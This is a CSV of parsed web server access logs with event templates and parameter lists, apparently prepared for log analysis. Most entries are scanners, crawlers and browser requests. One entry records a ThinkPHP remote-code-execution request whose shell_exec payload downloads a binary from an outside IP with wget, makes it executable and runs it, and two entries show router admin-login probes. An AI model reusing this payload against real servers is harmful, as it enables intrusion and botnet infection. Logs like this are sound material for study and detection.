LineId,IP,Time,Content,EventId,EventTemplate,ParameterList
2706,172.31.1.254,26/Sep/2021:09:11:16 +0800,"""GET / HTTP/1.0"" 200 332 ""-"" ""masscan/1.3 (https://github.com/robertdavidgraham/masscan)"" ""-""",2ffa441d,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""masscan/<*>.<*> (https://github.com/robertdavidgraham/masscan)"" ""-""","['1.0', '200 332', '1.3']"
2741,172.31.1.254,26/Sep/2021:09:25:57 +0800,"""GET / HTTP/1.1"" 200 255 ""-"" ""Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/60.0.3077.96 Safari/537.32"" ""-""",858a6302,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (Windows NT <*>.<*>;en-US) AppleWebKit/<*>.<*>.<*> (KHTML, live Gecko) Chrome<*> Safari/<*>.<*>"" ""-""","['1.1', '200 255', '5.0', '6.2', '537', '32.36', '/60.0.3077.96', '537.32']"
3064,172.31.1.254,26/Sep/2021:09:33:51 +0800,"""GET / HTTP/1.0"" 200 332 ""-"" ""masscan/1.3 (https://github.com/robertdavidgraham/masscan)"" ""-""",2ffa441d,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""masscan/<*>.<*> (https://github.com/robertdavidgraham/masscan)"" ""-""","['1.0', '200 332', '1.3']"
3463,172.31.1.254,26/Sep/2021:09:56:34 +0800,"""GET / HTTP/1.0"" 200 332 ""-"" ""masscan/1.3 (https://github.com/robertdavidgraham/masscan)"" ""-""",2ffa441d,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""masscan/<*>.<*> (https://github.com/robertdavidgraham/masscan)"" ""-""","['1.0', '200 332', '1.3']"
3884,172.31.1.254,26/Sep/2021:10:00:55 +0800,"""GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://88.218.227.141/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1"" 400 157 ""-"" ""Tsunami/2.0"" ""-""",8861b146,"""GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[<*>]=shell_exec&vars[<*>][]= 'wget http:/<*>/YourName/BinName.x86 -O /tmp/.Fdp; chmod <*> /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/<*>.<*>"" <*> <*> ""-"" ""Tsunami/<*>.<*>"" ""-""","['0', '1', '/88.218.227.141', '777', '1.1', '400 157', '2.0']"
4379,172.31.1.254,26/Sep/2021:10:18:23 +0800,"""GET / HTTP/1.1"" 200 255 ""-"" ""'Cloud mapping experiment. Contact research@pdrlabs.net'"" ""-""",ab8cf675,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""'Cloud mapping experiment. Contact research@pdrlabs.net'"" ""-""","['1.1', '200 255']"
5531,172.31.1.254,26/Sep/2021:11:05:32 +0800,"""OPTIONS /flow/demand/balanceLoadList HTTP/1.1"" 200 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; LCTE)"" ""-""",d19bbd7a,"""OPTIONS <*> HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; WOW64; Trident/<*>.<*>; .NET4.0C; .NET4.0E; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; LCTE)"" ""-""","['/flow/demand/balanceLoadList', '1.1', '200 0', '4.0', '7.0', '10.0', '7.0', '2', '0.50727', '3', '0.30729', '3', '5.30729']"
6717,172.31.1.254,26/Sep/2021:11:31:05 +0800,"""GET / HTTP/1.1"" 200 255 ""-"" ""Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"" ""-""",59133465,"""GET <*> HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (compatible; Baiduspider/<*>.<*>; +http://www.baidu.com/search/spider.html)"" ""-""","['/', '1.1', '200 255', '5.0', '2.0']"
6964,172.31.1.254,26/Sep/2021:12:00:06 +0800,"""GET / HTTP/1.1"" 200 255 ""-"" ""Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K)"" ""-""",67a9f856,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Dalvik/<*>.<*>.<*> (Linux; U; Android <*>.<*>; ZTE BA520 Build/MRA58K)"" ""-""","['1.1', '200 255', '2', '1.0', '9.0']"
6965,172.31.1.254,26/Sep/2021:12:00:07 +0800,"""GET / HTTP/1.1"" 200 255 ""-"" ""Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K)"" ""-""",67a9f856,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Dalvik/<*>.<*>.<*> (Linux; U; Android <*>.<*>; ZTE BA520 Build/MRA58K)"" ""-""","['1.1', '200 255', '2', '1.0', '9.0']"
7012,172.31.1.254,26/Sep/2021:12:20:22 +0800,"""GET / HTTP/1.1"" 200 255 ""-"" ""Linux Gnu (cow)"" ""-""",9fb22216,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Linux Gnu (cow)"" ""-""","['1.1', '200 255']"
7159,172.31.1.254,26/Sep/2021:13:11:54 +0800,"""GET / HTTP/1.1"" 200 255 ""-"" ""Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"" ""-""",4ae67ee4,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> <*> rv:<*>.<*>) <*> <*> ""-""","['1.1', '200 255', '5.0', '6.1', 'WOW64; Trident/7.0;', '11.0', 'like Gecko""']"
9118,172.31.1.254,26/Sep/2021:14:29:09 +0800,"""POST /boaform/admin/formLogin HTTP/1.1"" 404 124 ""http://112.17.251.82:80/admin/login.asp"" ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"" ""-""",55f54f0c,"""POST /boaform/admin/formLogin HTTP/<*>.<*>"" <*> <*> ""http:/<*>/admin/login.asp"" ""Mozilla/<*>.<*> (X11; Ubuntu; Linux x86_<*>; rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*>"" ""-""","['1.1', '404 124', '/112.17.251.82:80', '5.0', '64', '71.0', '20100101', '71.0']"
9119,172.31.1.254,26/Sep/2021:14:29:10 +0800,""""" 400 0 ""-"" ""-"" ""-""",fec19c0b,""""" <*> <*> ""-"" ""-"" ""-""",['400 0']
9779,172.31.1.254,26/Sep/2021:14:57:58 +0800,"""GET / HTTP/1.1"" 200 255 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0"" ""-""",4ae67ee4,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> <*> rv:<*>.<*>) <*> <*> ""-""","['1.1', '200 255', '5.0', '10.0', 'Win64; x64;', '92.0', 'Gecko/20100101 Firefox/92.0""']"
10617,172.31.1.254,26/Sep/2021:15:23:02 +0800,"""POST /boaform/admin/formLogin HTTP/1.1"" 404 124 ""http://112.17.251.82:80/admin/login.asp"" ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"" ""-""",55f54f0c,"""POST /boaform/admin/formLogin HTTP/<*>.<*>"" <*> <*> ""http:/<*>/admin/login.asp"" ""Mozilla/<*>.<*> (X11; Ubuntu; Linux x86_<*>; rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*>"" ""-""","['1.1', '404 124', '/112.17.251.82:80', '5.0', '64', '71.0', '20100101', '71.0']"
10618,172.31.1.254,26/Sep/2021:15:23:04 +0800,""""" 400 0 ""-"" ""-"" ""-""",fec19c0b,""""" <*> <*> ""-"" ""-"" ""-""",['400 0']
11634,172.31.1.254,26/Sep/2021:15:46:23 +0800,"""GET / HTTP/1.1"" 200 332 ""-"" ""Mozilla/5.0 (Linux; Android 4.4.4; Coolpad Y82-520 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN"" ""-""",c16d398e,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; Coolpad Y82-<*> Build/KTU84P) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> Mobile Safari/<*>.<*> MicroMessenger<*> NetType/4G Language/zh_CN"" ""-""","['1.1', '200 332', '5.0', '4', '4.4', '520', '537.36', '4.0', '/33.0.0.0', '537.36', '/6.5.4.1000']"
12544,172.31.1.254,26/Sep/2021:16:04:59 +0800,"""OPTIONS / HTTP/1.1"" 405 157 ""-"" ""Microsoft Office Protocol Discovery"" ""-""",e504bd2c,"""OPTIONS / HTTP/<*>.<*>"" <*> <*> ""-"" ""Microsoft Office Protocol Discovery"" ""-""","['1.1', '405 157']"
15119,172.31.1.254,26/Sep/2021:16:43:26 +0800,"""GET / HTTP/1.1"" 200 255 ""-"" ""Mozilla/5.0 zgrab/0.x"" ""-""",baa54154,"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> zgrab/<*>.x"" ""-""","['1.1', '200 255', '5.0', '0']"
15349,172.31.1.254,26/Sep/2021:16:47:29 +0800,"""GET /bag2 HTTP/1.1"" 404 184 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"" ""-""",5cf96ee9,"""GET /bag2 HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>)"" ""-""","['1.1', '404 184', '4.0', '8.0', '6.0', '4.0']"
